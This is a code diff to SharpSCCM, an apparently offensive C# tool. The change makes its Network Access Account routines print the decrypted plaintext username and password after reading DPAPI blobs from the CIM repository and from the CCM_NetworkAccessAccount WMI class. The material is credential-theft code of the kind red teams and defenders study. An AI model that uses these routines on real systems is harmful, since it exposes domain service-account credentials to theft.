@@ -10,6 +10,7 @@ namespace SharpSCCM
 
         public static void LocalNetworkAccessAccountsDisk()
         {
+            Console.WriteLine($"[*] Retrieving Network Access Account blobs from CIM repository\n");
             // Path of the CIM repository
             string cimRepoPath = "C:\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";
 
@@ -17,14 +18,13 @@ namespace SharpSCCM
             FileInfo cimRepo = new FileInfo(cimRepoPath);
             uint bytesToSearch = (uint) (int) cimRepo.Length;
 
-            Console.WriteLine($"[*] Searching the CIM repository for DPAPI blobs\n");
             if (FileContainsDpapiBlob(cimRepoPath, bytesToSearch))
             {
-                Console.WriteLine($"Found potential DPAPI blob at {cimRepoPath}");
+                Console.WriteLine($"[*]     Found potential DPAPI blob at {cimRepoPath}");
             }
             else
             {
-                Console.WriteLine("No DPAPI blob found");
+                Console.WriteLine($"[!]     No DPAPI blob found");
             }
         }
 
@@ -76,6 +76,7 @@ namespace SharpSCCM
         {
             if (Helpers.IsHighIntegrity())
             {
+                Console.WriteLine($"[*] Retrieving Network Access Account blobs via WMI\n");
                 ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig");
                 MgmtUtil.GetClassInstances(sccmConnection, "CCM_NetworkAccessAccount");
                 ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
@@ -102,8 +103,12 @@ namespace SharpSCCM
 
                         try
                         {
-                            Dpapi.Execute(protectedUsername, mappings);
-                            Dpapi.Execute(protectedPassword, mappings);
+                            string username = Dpapi.Execute(protectedUsername, mappings);
+                            string password = Dpapi.Execute(protectedPassword, mappings);
+
+                            Console.WriteLine("\r\n[*] Triaging Network Access Account Credentials\r\n");
+                            Console.WriteLine("     Plaintext NAA Username         : {0}", username);
+                            Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
                         }
                         catch (Exception e)
                         {
